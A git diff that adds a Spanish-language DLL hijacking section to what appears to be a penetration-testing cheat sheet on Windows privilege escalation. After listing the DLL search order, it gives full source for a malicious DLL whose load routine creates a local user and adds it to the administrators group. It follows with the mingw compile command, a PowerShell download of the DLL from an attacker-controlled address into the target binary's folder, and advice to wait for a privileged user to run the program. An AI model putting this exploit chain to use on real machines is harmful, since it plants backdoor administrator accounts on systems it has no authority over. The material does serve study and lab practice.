@@ -1609,6 +1609,60 @@ $ModifiableFiles
 $ModifiableFiles = echo 'C:\PATH\TO\BINARY\<BINARY>.exe argument -conf=C:\temp\path' | Get-ModifiablePath -Literal
 $ModifiableFiles
 ```
+##### DLL Hijacking
+
+###### Orden de búsqueda estándar
+
+El orden de búsqueda lo define Microsoft y determina que inspeccionar primero al buscar una DLL. De forma predeterminada, todos las versiones actuales de Windows tienen habilitada el modo de busqueda segurda de DLL.
+
+1. El directorio desde el que se cargó la aplicación.
+2. El directorio del sistema.
+3. El directorio del sistema de 16 bits.
+4. El directorio de Windows.
+5. El directorio actual.
+6. Los directorios que aparecen enumerados en la variable de entorno PATH.
+
+###### evildll.cpp
+```c++
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Manejar el módulo DLL
+DWORD ul_reason_for_call,// Motivo de la llamada a la función
+LPVOID lpReserved ) // Reservado
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // Un proceso está cargando la DLL.
+        int i;
+        i = system ("net user <USERNAME> <PASSWORD> /add");
+        i = system ("net localgroup administrators <USERNAME> /add");
+        break;
+        case DLL_THREAD_ATTACH: // Un proceso está creando un nuevo hilo.
+        break;
+        case DLL_THREAD_DETACH: // Un hilo termina normalmente.
+        break;
+        case DLL_PROCESS_DETACH: // Un proceso descarga la DLL.
+        break;
+    }
+    return TRUE;
+}
+```
+
+###### Compilar el archivo evildll.dll
+
+```bash
+x86_64-w64-mingw32-gcc evildll.cpp --shared -o evildll.dll
+```
+
+###### Transferimos la DLL a la máquina objetivo
+
+```powershell
+iwr -uri http://192.168.56.5/evildll.dll -OutFile 'C:\Ruta\Al\Binario\<FILE>.dll'
+```
+
+> Tener en cuenta, que si ejecutamos el binario con los privilegios de un usuario normal, el binario será ejecutado con esos privilegios y no es lo que queremos. Con esto en mente, no tenemos que iniciar la aplicación por nuestra cuenta. Deberemos esperar a que alguien con mayores privilegios la ejecute y active la carga de nuestra DLL maliciosa.
 
 ###  9.2. <a name='linux-2'></a>Linux
 
